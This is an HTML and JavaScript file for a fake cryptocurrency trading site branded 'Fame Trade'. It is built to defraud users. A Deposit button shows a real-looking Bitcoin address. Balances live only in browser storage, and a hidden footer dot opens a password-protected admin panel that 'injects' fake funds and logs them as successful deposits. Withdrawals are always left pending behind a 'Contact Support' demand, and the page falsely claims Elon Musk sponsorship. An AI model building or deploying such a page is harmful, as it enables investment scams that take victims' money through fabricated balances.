<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fame Trade | Professional History</title>
    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <style>
        :root { --green: #00c853; --red: #ff3d00; --dark: #0a0a0a; --card: #141414; --gold: #f3ba2f; }
        body { font-family: -apple-system, sans-serif; background: var(--dark); color: white; margin: 0; }
        .hidden { display: none !important; }
        .page { min-height: 100vh; padding: 15px; box-sizing: border-box; }
        .card { background: var(--card); border-radius: 15px; padding: 15px; border: 1px solid #222; margin-bottom: 15px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
        .btn-green { background: var(--green); color: white; }
        
        /* History Styles */
        .history-list { font-size: 0.85rem; width: 100%; border-collapse: collapse; }
        .history-list td { padding: 12px 5px; border-bottom: 1px solid #222; }
        .status-success { color: var(--green); }
        .status-pending { color: var(--gold); }
    </style>
</head>
<body>

<div id="main-site" class="page">
    <div class="card" style="text-align: center;">
        <div style="color: var(--gold);" id="btc-display">0.00000000 BTC</div>
        <div style="font-size: 2.5rem; font-weight: 800;" id="usd-display">$0.00</div>
        <div style="display: flex; gap: 10px; margin-top:10px;">
            <button class="btn btn-green" style="flex:1" onclick="alert('BTC: bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm')">Deposit</button>
            <button class="btn" style="flex:1; background:#333; color:white;" onclick="handleWithdraw()">Withdraw</button>
        </div>
    </div>

    <div id="chart-container" style="height:250px; border-radius:10px; overflow:hidden; margin-bottom:15px;"></div>

    <h3 style="margin: 20px 0 10px;">Activity History</h3>
    <div class="card">
        <table class="history-list">
            <tbody id="history-body">
                </tbody>
        </table>
    </div>

    <h3>Market Trading</h3>
    <div class="card" id="market-list" style="height: 150px; overflow-y: auto;"></div>

    <div style="text-align:center; color:#444; font-size:0.7rem;">
        <p>Sponsored by Elon Musk</p>
        <div onclick="openAdmin()" style="width:20px; height:20px; margin:auto;">.</div>
    </div>
</div>

<div id="admin-dash" class="hidden" style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; color:black; padding:20px; overflow-y:auto; z-index:9999;">
    <h2>Admin Console <button onclick="location.reload()" style="float:right;">Exit</button></h2>
    <div style="background:#eee; padding:15px; border-radius:10px; margin:20px 0;">
        <h4>Inject Funds</h4>
        <input type="number" id="inj-amt" placeholder="Amount ($USD)" style="background:white; color:black; border:1px solid #ccc;">
        <button class="btn btn-green" onclick="inject()">Inject & Log History</button>
    </div>
    <h4>Captured User Logs</h4>
    <div id="user-logs-list"></div>
</div>

<script>
    let balance = parseFloat(localStorage.getItem('ft_bal')) || 0;
    let history = JSON.parse(localStorage.getItem('ft_history')) || [];

    function updateUI() {
        document.getElementById('usd-display').innerText = "$" + balance.toLocaleString();
        document.getElementById('btc-display').innerText = (balance / 98000).toFixed(8) + " BTC";
        
        const hBody = document.getElementById('history-body');
        hBody.innerHTML = history.length ? "" : "<tr><td style='text-align:center; color:#555;'>No recent activity</td></tr>";
        
        history.slice().reverse().forEach(item => {
            hBody.innerHTML += `
                <tr>
                    <td><b>${item.type}</b><br><small style="color:#666">${item.date}</small></td>
                    <td style="text-align:right">
                        <span style="color:${item.amt.includes('+') ? '#00c853' : 'white'}">${item.amt}</span><br>
                        <small class="${item.status === 'Success' ? 'status-success' : 'status-pending'}">${item.status}</small>
                    </td>
                </tr>`;
        });
    }

    function addHistory(type, amt, status) {
        const now = new Date().toLocaleDateString() + " " + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        history.push({type, amt, status, date: now});
        localStorage.setItem('ft_history', JSON.stringify(history));
        updateUI();
    }

    function inject() {
        const amt = parseFloat(document.getElementById('inj-amt').value);
        if(amt) {
            balance += amt;
            localStorage.setItem('ft_bal', balance);
            addHistory("Deposit", "+$" + amt.toLocaleString(), "Success");
            alert("Funds Injected & Logged!");
            document.getElementById('admin-dash').classList.add('hidden');
        }
    }

    function trade(coin) {
        if(balance <= 0) return alert("Insufficient Funds.");
        addHistory("Trade (" + coin + ")", "-$50.00", "Success");
        alert("Trade successful for " + coin);
    }

    function handleWithdraw() {
        if(balance < 500) return alert("Minimum withdrawal is $500.");
        addHistory("Withdrawal", "-$" + balance.toLocaleString(), "Pending");
        alert("Verification Required: Contact Support to release funds.");
    }

    function openAdmin() {
        const pass = prompt("Admin Password:");
        if(pass === "ElonMusk2025") document.getElementById('admin-dash').classList.remove('hidden');
    }

    // Initialize Markets & Charts
    function init() {
        const coins = ["BTC", "ETH", "SOL", "XRP", "DOGE"];
        const mList = document.getElementById('market-list');
        coins.forEach(c => {
            mList.innerHTML += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #222;">
                <b>${c}/USD</b> <button onclick="trade('${c}')" style="background:var(--green); color:white; border:none; border-radius:4px; padding:2px 10px;">Buy</button>
            </div>`;
        });

        new TradingView.widget({
            "container_id": "chart-container",
            "autosize": true,
            "symbol": "BINANCE:BTCUSDT",
            "theme": "dark",
            "hide_top_toolbar": true,
            "style": "1",
            "locale": "en"
        });
        updateUI();
    }

    window.onload = init;
</script>
</body>
</html>
